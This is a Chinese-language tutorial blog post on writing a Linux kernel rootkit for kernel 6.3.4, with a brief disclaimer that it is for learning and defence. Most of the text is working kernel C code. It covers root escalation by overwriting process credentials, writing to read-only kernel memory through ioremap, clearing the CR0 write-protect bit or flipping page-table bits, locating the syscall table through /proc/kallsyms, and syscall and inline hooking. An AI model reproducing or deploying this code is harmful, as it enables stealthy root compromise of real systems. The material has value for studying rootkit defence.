基础rootkit的编写学习
内核版本定为`linux-6.3.4`

**需要注意，这里一切的内容仅仅用于学习Linux驱动编程的高级技巧，并且主要为了帮助读者来更好的防范这种攻击 ;)**


# 行为
## 1. 提权

### 1.1. 直接修改cred
直接修改当前进程的cred结构体的uid, gid变量

```c
static ssize_t pwh_rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos){
    static char user_data[0x100];
    struct cred * cur_cred;
    size_t size = count > 0x100 ? 0x100 : count;
    int flags;
    flags = copy_from_user(user_data, buf, size);
    if(!strncmp(user_data, "root", 4)){
        printk(KERN_INFO "Streight Modify the cred...");
        cur_cred = (struct cred *)current->cred;
        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
    }
    return size;
}
```

### 1.2. 内核pwn常用控制流

调用`commit_creds(prepare_kernel_cred(NULL))`
但是在实验过程中导致了内核异常退出
```c

struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	if (WARN_ON_ONCE(!daemon))
		return NULL;
...
```
这里源码发现运行至此处会判断daemon是否为空,是则返回NULL,
而这样就导致`commit_creds`的参数为NULL, 然后在后面的代码执行过程中出现panic

但这招仍然在可控范围内，
因为我们使用`commit_creds`的目的就是为了提供一个拥有root权限的cred结构体，
而内核中初始化会存有一个静态的`init_creds`结构体供我们使用

```c
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
	.subscribers		= ATOMIC_INIT(2),
	.magic			= CRED_MAGIC,
#endif
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
...
```

所以这里我选择直接复制这个结构体作为参数,但在编译过程当中失败，理由是未识别的`init_cred`,
那么这里就默认`init_cred`并未被导出

那么这里还可以直接根据当前进程来不断向上遍历父进程直到init进程，进而获得`init_cred`
如下:
```c

    }else if(!strncmp(user_data, "escalate", 8)){
        printk(KERN_INFO "[peiwithhao rootkit] Prepare kernel cred and commit...");
        /* 获取当前进程的task_struct */
        tsk = current;
        while(tsk != tsk->parent){
            tsk = tsk->parent;
        }
        /* 此时task变为init进程 */
        commit_creds((struct cred *)tsk->cred);
```

### 1.3. 提升指定进程权限

这里不难理解，只需要使用内核提供的函数`get_pid_task`就可以获取对应pid的task结构体，然后修改其中cred内容即可

```c
static int ioctl_giver(pid_t pid){
    struct pid *user_pid;
    struct task_struct *finded_task;
    struct cred * cur_cred;
        user_pid = find_get_pid(pid);
        if(IS_ERR(user_pid)){
            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the pid...");
            return PTR_ERR(user_pid);
        }
    finded_task = get_pid_task(user_pid, PIDTYPE_PID);
        if(IS_ERR(finded_task)){
            printk(KERN_INFO "[peiwithhao rootkit] Failed to find the task_struct...");
            return PTR_ERR(finded_task);
        }
        cur_cred = (struct cred *)finded_task->cred;
        cur_cred->uid = cur_cred->euid = cur_cred->suid = cur_cred->fsuid = KUIDT_INIT(0);
        cur_cred->gid = cur_cred->egid = cur_cred->sgid = cur_cred->fsgid = KGIDT_INIT(0);
    return 0;
}
```
## 2. 修改任意地址
这里在驱动实际上可以直接写入内容，但写入的能力是有限的，
既然rootkit被部署在受害者的主机上，那不如将这一能力扩大，
那就是真正意义上的物理内存任你驰骋，视读写保护如土鸡瓦狗

这里是从a3师傅的[博客](https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3)当中学习到的重映射


尝试修改`prepare_kernel_cred`成功,说明我们成功写入了只读的内核代码段
```c
pwndbg> hex prepare_kernel_cred
+0000 0xffffffff8109c560  70 65 69 77 69 74 68 68  61 6f 00 48 89 fd 48 8b  │peiwithh│ao.H..H.│
+0010 0xffffffff8109c570  3d fb b1 5a 01 be c0 0c  00 00 e8 41 69 13 00 48  │=..Z....│...Ai..H│
+0020 0xffffffff8109c580  89 c3 48 85 c0 0f 84 c9  00 00 00 48 89 ef e8 8d  │..H.....│...H....│
+0030 0xffffffff8109c590  fb ff ff 48 89 df b9 16  00 00 00 48 89 c6 48 89  │...H....│...H..H.│
```

```c
static int arbitrary_write(void *dst, void *src, size_t size){
    size_t phys_addr, phys_offset;
    size_t phys_ioremap_addr;
    /* 获取虚拟地址所在物理页帧的首地址 */
    phys_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    /* 获取页内地址的偏移 */
    phys_offset = (size_t )dst & 0xfff;
    /* 重新映射该物理地址到另一个虚拟地址 */
    phys_ioremap_addr = (size_t)ioremap(phys_addr, PAGE_SIZE);
    /* 拷贝内容到该虚拟地址,从而间接拷贝到只读物理地址 */
    memcpy((size_t *)(phys_ioremap_addr + phys_offset), src, size);
    /* 最后调用该函数来解除映射 */
    iounmap((size_t *)phys_ioremap_addr);
    return 0;
}
```
这里记录一下a3师傅的内容：
由于我们想要实现的目的是写任意物理地址，那么linux内存布局当中的physmap,也叫direct mapping
区域是一个很好的目标，这一段虚拟内存区域映射了所有的物理内存，
并且他的这段虚拟地址和物理内存是线性对应的，因此很方便宝宝们急迫想要通过虚拟地址转换到物理地址的心情，
但可惜的是这段区域在映射的时候已经进行了权限的划分，所以达不到我们任意写的目的


除此之外，kmap也是一个将物理地址映射到虚拟地址的方法,但是这里在kmap中所作的事情是
调用`page_to_virt`
他的实现如下:
```c

#define page_address(page) lowmem_page_address(page)

static __always_inline void *lowmem_page_address(const struct page *page)
{
	return page_to_virt(page);
}

#define page_to_virt(x)	__va(PFN_PHYS(page_to_pfn(x)))
#define PFN_PHYS(x)	((phys_addr_t)(x) << PAGE_SHIFT)

```
可以看到也是获取该page的物理页帧号，然后从physmap中取得虚拟地址,所以kmap不可行的原因同上面physmap一致

---

第二种技术为直接修改cr0寄存器
在intel手册上面对于cr0寄存器有这样一段描述
> Write Protect (bit 16 of CR0) — When set, inhibits supervisor-level procedures from writing into read-only pages; when clear, allows supervisor-level procedures to write into read-only pages (regardless of the U/S bit setting; see Section 4.1.3 and Section 4.6). This flag facilitates implementation of the copy-on-write method of creating a new process (forking) used by operating systems such as UNIX. This flag must be set before software can set CR4.CET, and it cannot be cleared as long as CR4.CET = 1 (see below).

所以我们可以通过仅仅内敛汇编语句来写入cr0,将16位置0就可以实现任意内存写

具体如下：
```c

static void asm_write_cr0(size_t cr0){
    asm volatile(
        "movq %0, %%rax;"
        "movq %%rax, %%cr0;"
            :: "r"(cr0): "%rax"
    );
}
```
通过这个步骤就能实现只读页的修改，同样可以使用修改代码段来进行测试
但需要注意这个操作很容易被防住

---

第三种办法就是修改页标志位

我们都知道在linux的最后一级页表都包含着所指向页的标识位

```
~ PT Entry ~                                                    Present ──────┐
                                                            Read/Write ──────┐|
                                                      User/Supervisor ──────┐||
                                                  Page Write Through ──────┐|||
                                               Page Cache Disabled ──────┐ ||||
                                                         Accessed ──────┐| ||||
┌─── NX                                                    Dirty ──────┐|| ||||
|┌───┬─ Memory Protection Key              Page Attribute Table ──────┐||| ||||
||   |┌──────┬─── Ignored                               Global ─────┐ |||| ||||
||   ||      | ┌─── Reserved                          Ignored ───┬─┐| |||| ||||
||   ||      | |┌──────────────────────────────────────────────┐ | || |||| ||||
||   ||      | ||            4KB Page Physical Address         | | || |||| ||||
||   ||      | ||                                              | | || |||| ||||
XXXX XXXX XXXX 0XXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX XXXX
       56        48        40        32        24        16         8         0
```

可以看到低12位就是有关该pte指向的page的描述
里面存在一个读写位(R/W),位于第1位(0位为开头),如果为0表示该页不允许写入
所以我们只需要获取到虚拟页所在的页目录，然后修改其中的读写位即可实现任意地址写入


我们可以通过下面的函数来找到虚拟地址所映射到的pte
```c
/*
 * Lookup the page table entry for a virtual address. Return a pointer
 * to the entry and the level of the mapping.
 *
 * Note: We return pud and pmd either when the entry is marked large
 * or when the present bit is not set. Otherwise we would return a
 * pointer to a nonexisting mapping.
 */
pte_t *lookup_address(unsigned long address, unsigned int *level)
{
	return lookup_address_in_pgd(pgd_offset_k(address), address, level);
}
EXPORT_SYMBOL_GPL(lookup_address);
```

修改示例代码如下，在我自己编译调试的过程中发现直接修改pte这个步骤被编译器优化掉了，
所以这里象征性输出一遍`pte`

```c
static size_t arbitrary_pte_write(void *dst, void *src, size_t size){
    pte_t * pte;
    pte_t orig_pte;
    unsigned int level;
    pte = lookup_address((unsigned long)dst, &level);
    if(IS_ERR(pte)){
        printk(KERN_INFO "[peiwithhao rootkit] get pte failed...");
        return PTR_ERR(pte);
    }
    /* 保存以前的pte */
    orig_pte.pte = pte->pte;
    /* 将rw位置为1 */
    pte->pte |= _PAGE_RW;
    printk(KERN_INFO "[peiwithhao rootkit] changed pte %lx, ", pte->pte);
    memcpy(dst, src, size);
    /* 恢复原来的pte */
    pte->pte = orig_pte.pte;
    return 0;
}
```
## hook
### 系统表hook
首先找到系统调用表
`arch/x86/include/generated/asm/syscalls_64.h`
我们可以通过内核代码调用`call_usermodehelper()`这个内核函数来调用用户态的程序
这里我们可以让用户态程序读取`/proc/kallsyms`文件获取内容，然后总结一个特征，
之后返回内核态来遍历整个内核寻找这个特征，找到之后就说明我们找到了内核系统调用表的地址了

```c
//用户态
...
    kallsyms_file = fopen("/proc/kallsyms", "r");
    if(kallsyms_file < 0){
        perror("fopen");
        return 1;
    }
    while(syscall_count != 5){
        fscanf(kallsyms_file, "%lx %c %100s", &kinfo.kaddr, &kinfo.type, kinfo.name);
        if(!strcmp(kinfo.name, "__x64_sys_read")){
            kern_seek_data[0] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_write")){
            kern_seek_data[1] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_open")){
            kern_seek_data[2] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_close")){
            kern_seek_data[3] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_newstat")){
            kern_seek_data[4] = kinfo.kaddr;
            syscall_count++;
        }
    }
...


//内核态
...
    /* 调用用户态程序 */
    /* UMH_WAIT_PROC这个标识符表示要等用户程序执行完毕 */
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    if(!get_syscall_data){
        panic("failed to get the sycall data from userspace!");
    }
    for(size_t i = 0;; i++){
        if(phys_mem[i+0] == syscall_table_data[0]
        && phys_mem[i+1] == syscall_table_data[1]
        && phys_mem[i+2] == syscall_table_data[2]
        && phys_mem[i+3] == syscall_table_data[3]
        ){
            syscall_table_addr = (size_t)&(phys_mem[i]);
            printk(KERN_INFO "[peiwithhao rootkit] sys_call_table founded at %lx", syscall_table_addr);
            break;
        }
    }
...
```
然后我们利用之前的任意写函数来改写该系统调用表的任意地址就可以达成hook


### inline hook
什么是inline hook, 实际上就是修改目标hook点的汇编代码，变成一串jmp <target addr>, 然后hook程序完毕后再恢复上下文的过程

这里我个人实现的inline hook,大致原理如下:


          ┌────────────┐
       ┌─►│ orgi_code: │
       │  │         1: │
       │  │         2: │
       │  │         3: │
       │  │         4: │
       │  └────┬───────┘
       │       │
       │       │
       │       │                                            super_hooker
       │       │                                       ┌────────────────────────────┐
       │       │                              ┌──────► │    push regs....           │
       │       │                              │        │    mov rax, *              │
       │       │                              │        │    jmp rax         ───────────┐
       │       │      ┌─────────────────┐     │        │                            │  │
       │       │      │ orig_code:      │     │        │                            │  │
       │       │      │     1: (hooked) ├─────┘        │                            │  │
       │       └─────►│     2: payload  │              │                            │  │
       │              │     3: payload  ├────────────► └────────────────────────────┘  │
       │              │     4:          │                                              │
       │              │     5:          │                                              ▼
       │              └─────────────────┘                                      ┌──────────────────────────┐
       │                                                                       │    hook_king_code:       │
       │                                                                       │                          │
       │                                                                       │    1: hooker_func        │
       │                                                                       │    2: restore orig_code  │
       │                                                                       │    3: pop regs...        │
       └─────────────────────────────────────────────────────────────────────────── 4: jmp orig_code      │
                                                                               │                          │
                                                                               └──────────────────────────┘


这里个人实现的仅仅为一次的hook，至于持久化的hook感觉可以参考a3师傅的动态hook技术，但这一点始终没有想好该如何结合自己所得出的hook技巧














# 参考
[https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3](https://xz.aliyun.com/t/12439?time__1311=GqGxRQ0%3Dq7qxlxx2mDu0maqY5okqWwnwmD#toc-3)
[分页](https://zolutal.github.io/understanding-paging/)
